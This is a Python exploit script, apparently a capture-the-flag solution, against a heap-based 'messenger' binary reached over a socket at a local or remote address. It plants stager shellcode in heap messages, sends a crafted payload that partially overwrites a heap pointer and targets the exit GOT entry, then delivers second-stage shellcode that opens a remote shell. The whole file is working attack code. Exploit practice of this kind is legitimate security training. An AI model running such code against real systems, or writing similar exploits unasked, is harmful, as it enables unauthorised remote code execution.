#!/usr/bin/env python
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'192.168.75.147','port':8080}, \
                        remote  = {'host':'110.10.212.137','port':3333})
env.select()

binf = ELF('messenger')
addr_got_exit   = binf.got('exit')

#==========
def attack(cmn):
    cmn.read_until('>> ')
    cmn.sendln('L')
    cmn.read_until('size : ')
    cmn.sendln('10')
    cmn.read_until('msg : ')
    cmn.send('A'*4)

    sc = ShellCode('amd64')
    shellcode_st1  = sc.stager()
    
    cmn.read_until('>> ')
    cmn.sendln('L')
    cmn.read_until('size : ')
    cmn.sendln(str(len(shellcode_st1)))
    cmn.read_until('msg : ')
    cmn.send(shellcode_st1)

    exploit  = '\xe9'+pack_32(0x30-5)           # jmp 0x30
    exploit += '\x00'*(0x20-len(exploit))
    exploit += pack_64(addr_got_exit - 0x10)
    exploit += '\x30'                           # partial overwrite addr_heap : 0xXXXXXX30

    cmn.read_until('>> ')
    cmn.sendln('C')
    cmn.read_until('index : ')
    cmn.sendln('0')
    cmn.read_until('size : ')
    cmn.sendln(str(len(exploit)))
    cmn.read_until('msg : ')
    cmn.send(exploit)
 
    cmn.read_until('>> ')
    cmn.sendln('R')
    cmn.read_until('index : ')
    cmn.sendln('1')

    cmn.read_until('>> ')
    cmn.sendln('_')

    shellcode_st2  = sc.alarm(0)
    shellcode_st2 += sc.sh()
    cmn.send(shellcode_st2)
    
#==========

if __name__=='__main__':
    cmn = Communicate(env.target, env.mode)
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
